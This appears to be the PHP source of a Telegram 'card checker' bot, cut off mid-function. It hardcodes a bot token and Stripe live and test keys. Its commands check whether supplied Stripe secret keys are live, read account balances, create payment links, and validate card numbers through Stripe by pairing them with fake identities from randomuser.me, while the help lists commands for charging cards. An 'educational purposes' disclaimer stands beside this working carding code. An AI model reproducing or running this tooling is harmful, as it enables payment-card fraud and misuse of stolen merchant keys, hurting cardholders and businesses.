<?php
//==========================[setup]==========================//
$botToken = "5020014857:AAEKpsdaG879QntGTTXbK3qgbc5c6nxB46k"; // Enter ur bot token
$website = "https://api.telegram.org/bot".$botToken;
error_reporting(0);
$update = file_get_contents('php://input');
$update = json_decode($update, TRUE);
$print = print_r($update);
$chatId = $update["message"]["chat"]["id"];
$gId = $update["message"]["from"]["id"];
$userId = $update["message"]["from"]["id"];
$firstname = $update["message"]["from"]["first_name"];
$usernamee = $update["message"]["from"]["username"];
$message = $update["message"]["text"];
$message_id = $update["message"]["message_id"];
  $sktest = 'sk_test_51NGgGlEzbVZNtSWJH3a3FHiAhAFOa3RpzG64C1MOIQM7bdf2bXB8VuPLo40CYbQzHtrJVZEbWRSDBOMH9TaO5jOr00jE5UZPlv';
  $pktest = 'pk_test_51NGgGlEzbVZNtSWJdiHPiNa0lZJP5BHCULRrLTqy0ly69QCGO4Y0Zd0ncXDg1kkf7AJWgAhTl2ousekbc4amOYpD00FWzzENwL';
  $sk = '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';
  $pk = 'pk_live_51NGgGlEzbVZNtSWJyqEtd1ZXtIbidZ999PJxmPj3fteRJYmevARmlnfrWN8B1mw3wVLEcyIohzDGb5JxJGdaiU1e00acK3PQtL';
//==========================[Global function]==========================//
function GetStr($string, $start, $end){
    $str = explode($start, $string);
    $str = explode($end, $str[1]);  
    return $str[0];
    };
    function multiexplode($delimiters, $string)
    {
      $one = str_replace($delimiters, $delimiters[0], $string);
      $two = explode($delimiters[0], $one,$string);
      return $two;
    }
    function random_strings($length_of_string) 
    {
        $str_result = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'; 
        return substr(str_shuffle($str_result),  
                           0, $length_of_string); 
    }
    $get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
    preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
    $name = $matches1[1][0];
    preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
    $last = $matches1[1][0];
    preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
    $email = $matches1[1][0];
    preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
    $street = $matches1[1][0];
    preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
    $city = $matches1[1][0];
    preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
    $state = $matches1[1][0];
    preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
    $phone = $matches1[1][0];
    preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
    $postcode = $matches1[1][0];
//==========================[Command Lits]==========================//
    //==================[Start Command]==================//
    if (strpos($message, "/start") === 0){
      sendMessage($chatId, "<b>✅Bot Started succedfully</b>\n\n<b>Hello @$usernamee!!</b>Type <code>/help</code> to know all my commands!!\n\n <b>Bot Made by: Stowe .</b>", $message_id);
      sendMessage($chatId, "<b>⚠️ BEFORE YOU USE ⚠️</b> \n\n
      ℹ️ <b>This bot make for educational purposes and should not be used for any illegal or unethical activities.</b> The information and code provided are for learning and understanding purposes only. It is important to respect the terms of service and guidelines of any platform or service you interact with.\n 
      Using this bot or any code snippets provided responsibly and in compliance with applicable laws and regulations is the responsibility of the user. The creators and maintainers of this bot are not liable for any misuse or illegal activities conducted with the help of this bot.\n
      Remember to always seek proper authorization and permissions before interacting with any third-party services or systems. Be mindful of privacy, security, and ethical considerations when using the bot or any code provided . <b>education purpse only</b>", $message_id);
      sendMessage($chatId, "<b>✅ Update V3.0 info</b>\n\n
      <b>Update stripe API to V2.1</b>\n
      <code>(bug old version still there) API V3 will update soon </code>\n
      <b>Added SK tool</b>\n
      <code>Pm_page, balance, integration check</code>\n
      <b>Fixed crital bug #1</b>\n
      <code>Respone body was force to HTML mode. This mean to end user maybe show message not correctly</code>\n
      For more information type command <code>/log </code> to show all information", $message_id);
  }
  //==================[Help Command]==================//
  elseif (strpos($message, "/help") === 0){
    sendMessage($chatId, "-----[<b>SK Tool</b>]-----\n<u>Check SK Live</u>:<code>/sk sk_live_xxxxxxx</code>\n<u>Check balance Stripe account</u>:<code>/bal sk_live_xxxxx</code>\n<u>Create Payment Session page</u>:<code>/pmc sk_live_xxxxx|[ammount]</code>Currency is USD \n<u>Check integration</u>:<code>/int sk_live_xxxxxx</code>\n\n-----[<b>Cards Tool</b>]-----\n<u>Card bin check:</u> <code>/bin xxxxxxx</code>\n<u>Card algorithm check:</u> <code>/agt xxxxxxxxxxxxxxxx|xx|xx|xxx</code>\n<u>Auth card</u>:<code>/aut xxxxxxxxxxxxxxxx|xx|xx|xxx</code>\n<u>CCN Auth</u>:<code>/cut xxxxxxxxxxxxxxxx|xx|xx|xxx</code>\n<u>Charge 1$</u>:<code>/chg xxxxxxxxxxxxxxxx|xx|xx|xxx</code>\n<u>Charge 5$</u>:<code>/chf xxxxxxxxxxxxxxxx|xx|xx|xxx</code>\n<u>CCN charge 5$</u>:<code>/nch xxxxxxxxxxxxxxxx|xx|xx|xxx</code>\n<u>Custom SK 5$ charge </u>:<code>/ck Sk_live_xxxxx|xxxxxxxxxxxxxxxx|xx|xx|xxx</code>\n<u>Custom SK 5$ CCN charge </u>:<code>/nk Sk_live_xxxxx|xxxxxxxxxxxxxxxx|xx|xx|xxx</code>\n\n-----[<b>Other</b>]-----\n<u>Show all commands</u>:<code>/help</code>\n<u>your info</u>:<code>/info</code>\n<u>Update Logs</u>:<code>/log</code>\n<u>Befor you use</u>:<code>/beu</code>\n<u>Ask GPT</u>:<code>/gpt</code>\n<u>Generate info</u>:<code>/inf [country code]</code>\n<u>Service Status</u>:<code>/sta</code>\n\n<b>Bot Made By: Stowe</b>\n<b>Bot version</b>:<code>3.0</code>", $message_id);
}
  //==================[SK Command]==================//
  elseif (strpos($message, "/sk") === 0){
    $sec = substr($message, 4);
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, "card[number]=5154620061414478&card[exp_month]=01&card[exp_year]=2023&card[cvc]=235");
    curl_setopt($ch, CURLOPT_USERPWD, $sec. ':' . '');
    $headers = array();
    $headers[] = 'Content-Type: application/x-www-form-urlencoded';
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    $result = curl_exec($ch);
    if (strpos($result, 'api_key_expired')){
    sendMessage($chatId, "<b>❌ DEAD KEY</b>\n<u>KEY:</u> <code>$sec</code>\n<u>REASON:</u> EXPIRED KEY\n\n<b>Bot Made by: Stowe .</b>", $message_id);
    }
    elseif (strpos($result, 'Invalid API Key provided')){
    sendMessage($chatId, "<b>❌ DEAD KEY</b>\n<u>KEY:</u> <code>$sec</code>\n<u>REASON:</u> INVALID KEY\n\n<b>Bot Made by: Stowe .</b>", $message_id);
    }
    elseif ((strpos($result, 'testmode_charges_only')) || (strpos($result, 'test_mode_live_card'))){
    sendMessage($chatId, "<b>❌ DEAD KEY</b>\n<u>KEY:</u> <code>$sec</code>\n<u>REASON:</u> Testmode Charges Only\n\n<b>Bot Made by: Stowe .</b>", $message_id);
    }
    elseif (strpos($result, 'Request rate limit exceeded')){
    sendMessage($chatId, "<b>⚠️ LIVE KEY</b>\n<u>KEY:</u> <code>$sec</code>\n<u>REASON:</u> Rate Limit Key\n\n<b>Bot Made by: Stowe .</b>", $message_id);
    }else{
    sendMessage($chatId, "<b>✅ LIVE KEY</b>\n<u>KEY:</u> <code>$sec</code>\n<u>RESPONSE:</u> SK LIVE!!\n\n<b>Bot Made by: Stowe .</b>", $message_id);
    };
  }
  //==================[Balance Command]==================//
  elseif (strpos($message, "/bal") === 0){
    $sec = substr($message, 4);
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/balance');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_USERPWD, $sec. ':' . '');
    $headers = array();
    $headers[] = 'Content-Type: application/x-www-form-urlencoded';
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    $result = curl_exec($ch);
    $data = json_decode($result); // Chuyển đổi chuỗi JSON thành đối tượng
    // Lấy giá trị từ đối tượng
    $availableAmount = $data->available[0]->amount;
    $availableCurrency = trim($data->available[0]->currency);
    $pendingAmount = $data->pending[0]->amount;
    $pendingCurrency = trim($data->pending[0]->currency);
    if (strpos($result, 'api_key_expired')){
    sendMessage($chatId, "<b>❌ DEAD KEY</b>\n<u>KEY:</u> <code>$sec</code>\n<u>REASON:</u> EXPIRED KEY\n\n<b>Bot Made by: Stowe .</b>", $message_id);
    }
    elseif (strpos($result, 'Invalid API Key provided')){
    sendMessage($chatId, "<b>❌ DEAD KEY</b>\n<u>KEY:</u> <code>$sec</code>\n<u>REASON:</u> INVALID KEY\n\n<b>Bot Made by: Stowe .</b>", $message_id);
    }
    elseif ((strpos($result, 'testmode_charges_only')) || (strpos($result, 'test_mode_live_card'))){
    sendMessage($chatId, "<b>❌ DEAD KEY</b>\n<u>KEY:</u> <code>$sec</code>\n<u>REASON:</u> Testmode Charges Only\n\n<b>Bot Made by: Stowe .</b>", $message_id);
    }
    elseif (strpos($result, 'Request rate limit exceeded')){
    sendMessage($chatId, "<b>⚠️ LIVE KEY</b>\n<u>KEY:</u> <code>$sec</code>\n<u>REASON:</u> Rate Limit Key\n\n<b>Bot Made by: Stowe .</b>", $message_id);
    }else{
    sendMessage($chatId, "<b>✅ Balance Info</b>\n<u>KEY:</u> <code>$sec</code>\n<u>RESPONSE:</u> SK LIVE!!\n\n<b>Balance info:</b>\navailable balance:$availableAmount\nCurrency:$availableCurrency\n\nPending Amount:$pendingAmount\nPending Currency:$pendingCurrency\n\n<b>Bot Made by: Stowe .</b>", $message_id);
    };
  }
  //==================[Payment link Command]==================//
  elseif (strpos($message, "/pmc") === 0){
    $sec = substr($message, 4);
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/products');
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_USERPWD, $sec. ':' . '');
    curl_setopt($ch, CURLOPT_POSTFIELDS, 'name='.$name.'');
    $result1 = curl_exec($ch);
    $prod = Getstr($result1,'"id": "','"');
    if (strpos($result3, 'api_key_expired')){
        sendMessage($chatId, "<b>❌ DEAD KEY</b>\n<u>KEY:</u> <code>$sec</code>\n<u>REASON:</u> EXPIRED KEY\n\n<b>Bot Made by: Stowe .</b>", $message_id);
        return;
    }
    if (strpos($result3, 'Invalid API Key provided')){
    sendMessage($chatId, "<b>❌ DEAD KEY</b>\n<u>KEY:</u> <code>$sec</code>\n<u>REASON:</u> INVALID KEY\n\n<b>Bot Made by: Stowe .</b>", $message_id);
    return;
    }
    if ((strpos($result3, 'testmode_charges_only')) || (strpos($result, 'test_mode_live_card'))){
    sendMessage($chatId, "<b>❌ DEAD KEY</b>\n<u>KEY:</u> <code>$sec</code>\n<u>REASON:</u> Testmode Charges Only\n\n<b>Bot Made by: Stowe .</b>", $message_id);
    return;
    }
    if (strpos($result3, 'Request rate limit exceeded')){
    sendMessage($chatId, "<b>⚠️ LIVE KEY</b>\n<u>KEY:</u> <code>$sec</code>\n<u>REASON:</u> Rate Limit Key\n\n<b>Bot Made by: Stowe .</b>", $message_id);
    return;
    }
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/prices');
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_USERPWD, $sec. ':' . '');
    curl_setopt($ch, CURLOPT_POSTFIELDS, 'unit_amount=499&currency=usd&product='.$prod.'');
    $result2 = curl_exec($ch);
    $price = Getstr($result2,'"id": "','"');
    if (strpos($result3, 'api_key_expired')){
        sendMessage($chatId, "<b>❌ DEAD KEY</b>\n<u>KEY:</u> <code>$sec</code>\n<u>REASON:</u> EXPIRED KEY\n\n<b>Bot Made by: Stowe .</b>", $message_id);
        return;
    }
    if (strpos($result3, 'Invalid API Key provided')){
    sendMessage($chatId, "<b>❌ DEAD KEY</b>\n<u>KEY:</u> <code>$sec</code>\n<u>REASON:</u> INVALID KEY\n\n<b>Bot Made by: Stowe .</b>", $message_id);
    return;
    }
    if ((strpos($result3, 'testmode_charges_only')) || (strpos($result, 'test_mode_live_card'))){
    sendMessage($chatId, "<b>❌ DEAD KEY</b>\n<u>KEY:</u> <code>$sec</code>\n<u>REASON:</u> Testmode Charges Only\n\n<b>Bot Made by: Stowe .</b>", $message_id);
    return;
    }
    if (strpos($result3, 'Request rate limit exceeded')){
    sendMessage($chatId, "<b>⚠️ LIVE KEY</b>\n<u>KEY:</u> <code>$sec</code>\n<u>REASON:</u> Rate Limit Key\n\n<b>Bot Made by: Stowe .</b>", $message_id);
    return;
    }
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/checkout/sessions');
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_USERPWD, $sec. ':' . '');
    curl_setopt($ch, CURLOPT_POSTFIELDS, 'line_items[0][price]='.$price.'&line_items[0][quantity]=1&mode=payment&success_url=https://google.com');
  // Sau khi nhận được phản hồi từ yêu cầu tạo phiên thanh toán
  $result3 = curl_exec($ch);
  $response = json_decode($result3); // Chuyển đổi chuỗi JSON thành đối tượng PHP
  $plink = $response->url; // Trích xuất URL thanh toán từ đối tượng phản hồi

  if (strpos($result3, 'api_key_expired')){
    sendMessage($chatId, "<b>❌ DEAD KEY</b>\n_KEY:_ `$sec`\n_REASON:_ EXPIRED KEY\n\n<b>Bot Made by: Stowe.</b>", $message_id);
  }
  elseif (strpos($result3, 'Invalid API Key provided')){
    sendMessage($chatId, "<b>❌ DEAD KEY</b>\n_KEY:_ `$sec`\n_REASON:_ INVALID KEY\n\n<b>Bot Made by: Stowe.</b>", $message_id);
  }
  elseif ((strpos($result3, 'testmode_charges_only')) || (strpos($result, 'test_mode_live_card'))){
    sendMessage($chatId, "<b>❌ DEAD KEY</b>\n_KEY:_ `$sec`\n_REASON:_ Testmode Charges Only\n\n<b>Bot Made by: Stowe.</b>", $message_id);
  }
  elseif (strpos($result3, 'Request rate limit exceeded')){
    sendMessage($chatId, "⚠️ <b>LIVE KEY</b>\n_KEY:_ `$sec`\n_REASON:_ Rate Limit Key\n\n<b>Bot Made by: Stowe.</b>", $message_id);
  }
  else{
    $message = "✅<b>Payment Link created</b>\n
    <b>Currency: USD</b>\n
    <b>Price: 499</b>\n
    <b>Link: $plink</b>\n\n
    <b>Bot Made by: Stowe.</b>";
    sendMessage($chatId, $message, $message_id);
  }
}
  //==================[Bin Command]==================//
  elseif (strpos($message, "/bin") === 0){
    $bin = substr($message, 5);
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$bin.'');
    curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'Host: lookup.binlist.net',
    'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, '');
    $fim = curl_exec($ch);
    $bank = GetStr($fim, '"bank":{"name":"', '"');
    $name = GetStr($fim, '"name":"', '"');
    $brand = GetStr($fim, '"brand":"', '"');
    $country = GetStr($fim, '"country":{"name":"', '"');
    $scheme = GetStr($fim, '"scheme":"', '"');
    $type = GetStr($fim, '"type":"', '"');
    if(strpos($fim, '"type":"credit"') !== false){
    $bin = 'Credit';
    }else{
    $bin = 'Debit';
    };
    sendMessage($chatId, '<b>✅ Valid Bin</b>\n<b>Bank:</b> '.$bank.'\n<b>Country:</b> '.$name.'\n<b>Brand:</b> '.$brand.'\n<b>Card:</b> '.$scheme.'\n<b>Type:</b> '.$type.'\n<b>Checked By:</b> @'.$usernamee.'\n\n<b>Bot Made by: Stowe .</b>', $message_id);
    }
  //==================[aut Command]==================//
  elseif (strpos($message, "/aut") === 0){
  $message = substr($message, 4);
$amt = multiexplode(array("/", ":", " ", "|"), $message)[0];
$cc = multiexplode(array(":", "/", " ", "|"), $message)[1];
$mm = multiexplode(array(":", "/", " ", "|"), $message)[2];
$yy = multiexplode(array(":", "/", " ", "|"), $message)[3];
$cvv = multiexplode(array(":", "/", " ", "|"), $message)[4];
          $lista = ''.$cc.'|'.$mm.'|'.$yy.'|'.$cvv.'';
          $ch = curl_init();
          curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
          curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
          curl_setopt($ch, CURLOPT_HTTPHEADER, array(
          'Host: lookup.binlist.net',
          'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
          'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
          curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
          curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
          curl_setopt($ch, CURLOPT_POSTFIELDS, '');
          $fim = curl_exec($ch);
          $bank = GetStr($fim, '"bank":{"name":"', '"');
          $name = GetStr($fim, '"name":"', '"');
          $brand = GetStr($fim, '"brand":"', '"');
          $country = GetStr($fim, '"country":{"name":"', '"');
          $emoji = GetStr($fim, '"emoji":"', '"');
          $scheme = GetStr($fim, '"scheme":"', '"');
          $type = GetStr($fim, '"type":"', '"');
          if(strpos($fim, '"type":"credit"') !== false){
          $bin = 'Credit';
          }else{
          $bin = 'Debit';
          };
          $ch = curl_init();
          curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/sources');
          curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
          curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
          curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
          curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
          curl_setopt($ch, CURLOPT_USERPWD, $pk. ':' . '');
          curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&owner[name]='.$name.' '.$last.'&owner[email]='.$email.'&owner[address][line1]='.$street.'&owner[address][city]='.$city.'&owner[address][state]='.$state.'&owner[address][postal_code]='.$postcode.'&owner[address][country]=US&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mm.'&card[exp_year]='.$yy.'');
          $result1 = curl_exec($ch);
          $tok1 = Getstr($result1,'"id": "','"');
          $msg1 = Getstr($result1,'"message": "','"');
          $msg1a = Getstr($result1,'"decline_code": "','"');
          if(strpos($result1, "card_error")){
            sendMessage($chatId, " \n<b>Card: <code>$lista</code></b>\n<b>Status -» DECLINED ❌</b>\n<b>Response -» $msg1 </b>\n<b>Respone 2 -» $msg1a </b>\n<b>Gateway -» Stripe auth v2.1 </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
            return;
          }
          if (strpos($result1, "card_declined")){
            sendMessage($chatId, " \n<b>Card: <code>$lista</code></b>\n<b>Status -» DECLINED ❌</b>\n<b>Response -» $msg1 </b>\n<b>Respone 2 -» $msg1a </b>\n<b>Gateway -» Stripe auth v2.1 </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
            return;
          }
          if (strpos($result1, "rate_limit")){
            sendMessage($chatId, "\n<b>Card: <code>$lista</code></b>\n<b>Status -» TRY AGAIN LATER ⚠️</b>\n<b>Response -» SK is rate limit </b>\n<b>Gateway -» Stripe auth v2.1 </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
            return;
          }
          if (strpos($result1, "invalid_cvc")){
            sendMessage($chatId, "\n<b>Card: <code>$lista</code></b>\n<b>Status -» TRY AGAIN ⚠️</b>\n<b>Response -» Please input card correctly ! </b>\n<b>Gateway -» Stripe auth v2.1 </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
            return;
          }
          if (strpos($result1, "sources_required_type_param")){
            sendMessage($chatId, "\n<b>Card: <code>$lista</code></b>\n<b>Status -» TRY AGAIN ⚠️</b>\n<b>Response -» Please input card correctly ! </b>\n<b>Gateway -» Stripe auth v2.1 </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
            return;
          }
          if (strpos($result1, "testmode_charges_only")){
            sendMessage($chatId, "\n<b>Card: <code>$lista</code></b>\n<b>Status -» SERVER REJECTED ❌</b>\n<b>Response -» Gate is Dead </b>\n<b>Gateway -» Stripe auth v2.1 </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
            return;
          }
          if ((strpos($result3, 'invalid_expiry_year'))){
            sendMessage($chatId, "\n<b>Card: <code>$lista</code></b>\n<b>Status -» EXPRIED CARD ❌</b>\n<b>Response -» invalid_expiry_year </b>\n<b>Gateway -» Stripe auth v2.1 </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
            return;
          }
          if ((strpos($result3, 'invalid_expiry_month'))){
            sendMessage($chatId, "\n<b>Card: <code>$lista</code></b>\n<b>Status -» EXPRIED CARD ❌</b>\n<b>Response -» invalid_expiry_month </b>\n<b>Gateway -» Stripe auth v2.1 </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
            return;
          }
          if ((strpos($result3, 'incorrect_number'))){
            sendMessage($chatId, "\n<b>Card: <code>$lista</code></b>\n<b>Status -» INVALID CARD ❌</b>\n<b>Response -» Incorrect number </b>\n<b>Gateway -» Stripe auth v2.1 </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
            return;
          }

          $ch = curl_init();
          curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/customers');
          curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
          curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
          curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
          curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
          curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
          curl_setopt($ch, CURLOPT_POSTFIELDS, 'description='.$last.'&source='.$tok1.'&address[line1]='.$street.'&address[city]='.$city.'&address[state]='.$state.'&address[postal_code]='.$postcode.'&address[country]=US');
          $result2 = curl_exec($ch);
          $tok2 = Getstr($result2,'"id": "','"');
          $msg2 = Getstr($result2,'"message": "','"');
          $msg2a = Getstr($result1,'"decline_code": "','"');
          if(strpos($result2, "card_error")){
            sendMessage($chatId, " \n<b>Card: <code>$lista</code></b>\n<b>Status -» DECLINED ❌</b>\n<b>Response -» $msg2 </b>\n<b>Respone 2 -» $msg2a </b>\n<b>Gateway -» Stripe auth v2.1 </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
            return;
          }
          if (strpos($result2, "card_declined")){
            sendMessage($chatId, " \n<b>Card: <code>$lista</code></b>\n<b>Status -» DECLINED ❌</b>\n<b>Response -» $msg2 </b>\n<b>Respone 2 -» $msg2a </b>\n<b>Gateway -» Stripe auth v2.1 </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
            return;
          }
          if (strpos($result2, "rate_limit")){
            sendMessage($chatId, "\n<b>Card: <code>$lista</code></b>\n<b>Status -» TRY AGAIN LATER ⚠️</b>\n<b>Response -» SK is rate limit </b>\n<b>Gateway -» Stripe auth v2.1 </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
            return;
          }
          if (strpos($result2, "invalid_account")){
            sendMessage($chatId, "\n<b>Card: <code>$lista</code></b>\n<b>Status -» DECLINED ❌</b>\n<b>Response -» CALL ISUSSER  </b>\n<b>Gateway -» Stripe auth v2.1 </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
            return;
          }
          if (strpos($result1, "invalid_cvc")){
            sendMessage($chatId, "\n<b>Card: <code>$lista</code></b>\n<b>Status -» TRY AGAIN ⚠️</b>\n<b>Response -» Please input card correctly ! </b>\n<b>Gateway -» Stripe auth v2.1 </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
            return;
          }
          if (strpos($result1, "sources_required_type_param")){
            sendMessage($chatId, "\n<b>Card: <code>$lista</code></b>\n<b>Status -» TRY AGAIN ⚠️</b>\n<b>Response -» Please input card correctly ! </b>\n<b>Gateway -» Stripe auth v2.1 </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
            return;
          }
          curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/customers/'.$tok2.'/sources/'.$tok1.'');
          curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
          curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
          curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
          curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
          curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
          curl_setopt($ch, CURLOPT_POSTFIELDS, '');
          $result3 = curl_exec($ch);
          $msg3 = Getstr($result3,'"message": "','"');
          $msg3a = Getstr($result1,'"decline_code": "','"');
          if(strpos($result3, '"cvc_check": "pass"' )) {
